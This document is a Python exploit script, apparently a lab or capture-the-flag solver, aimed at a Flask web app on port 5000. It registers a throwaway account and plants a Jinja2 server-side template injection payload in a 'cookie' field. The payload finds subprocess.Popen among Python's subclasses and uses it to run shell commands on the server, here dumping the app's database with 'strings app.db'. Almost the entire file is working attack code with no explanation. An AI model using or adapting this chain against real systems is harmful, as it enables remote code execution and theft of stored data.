#!/usr/bin/python

from random_username.generate import generate_username
from fake_useragent import UserAgent
from requests import Session
from string import ascii_letters, digits
from random import choices
from bs4 import BeautifulSoup
from sys import argv

USERNAME = generate_username(1)[0]
PASSWORD = ''.join(choices(ascii_letters + digits, k=8))
USER_AGENT = UserAgent().random


def retrieve_csrf_token(s: Session, url: str) -> str:
    data = s.get(url).text
    soup = BeautifulSoup(data, 'html.parser')
    print(f'[+] Retrieved csrf_token from {url}')
    return soup.find(attrs={'id': 'csrf_token'})['value']


def register(s: Session, url: str) -> None:
    url += '/register'
    csrf_token = retrieve_csrf_token(s, url)
    s.post(url, data={
        'csrf_token': csrf_token,
        'username': USERNAME,
        'password': PASSWORD,
        'submit': 'Submit'
    })
    print('[+] Registered')


def login(s: Session, url: str) -> None:
    url += '/login'
    csrf_token = retrieve_csrf_token(s, url)
    s.post(url, data={
        'csrf_token': csrf_token,
        'username': USERNAME,
        'password': PASSWORD,
        'submit': 'Submit'
    })
    print('[+] Logged in')


def create_cookie(s: Session, url: str, cookie: dict) -> str:
    url += '/dashboard'
    csrf_token = retrieve_csrf_token(s, url)
    s.post(url, data={
        'csrf_token': csrf_token,
        'name': cookie['name'],
        'value': cookie['value'],
        'submit': 'Submit'
    })
    data = s.get(url).text
    soup = BeautifulSoup(data, 'html.parser')
    print(f'[+] Created cookie: {cookie["name"]}:{cookie["value"]}')
    return soup.find(attrs={'class': 'card-link'})['href']


def get_popen_index(s: Session, url: str) -> str:
    ssti = "{{ ''.__class__.__mro__[1].__subclasses__() }}"
    cookie = create_cookie(s, url, {
        'name': 'my first cookie',
        'value': ssti
    })
    url += cookie
    data = s.get(url).text
    soup = BeautifulSoup(data, 'html.parser')
    subclasses = soup.find(attrs={'class': 'lead'}).get_text()[1:-1]
    subclasses = subclasses.split(', ')
    print(f'[+] Retrieved subprocess.Popen index')
    return subclasses.index("<class 'subprocess.Popen'>")


def execute_shell(s: Session, url: str, shell: str) -> str:
    popen_index = get_popen_index(s, url)
    ssti = "{{ ''.__class__.__mro__[1].__subclasses__()[%s]('%s', shell=True, stdout=-1).communicate() }}" % (popen_index, shell)
    cookie = create_cookie(s, url, {
        'name': 'my second cookie',
        'value': ssti
    })
    url += cookie
    data = s.get(url).text
    soup = BeautifulSoup(data, 'html.parser')
    res = soup.find(attrs={'class': 'lead'}).get_text()[3:-8]
    res = res.replace('\\n', '\n')
    return res


def main() -> None:
    try:
        url = f'http://{argv[1]}:5000'
        s = Session()
        s.headers['User-Agent'] = USER_AGENT
        register(s, url)
        login(s, url)
        db = execute_shell(s, url, 'strings app.db')
        print(db)
    except:
        print('[-] Something went wrong')


if __name__ == '__main__':
    main()
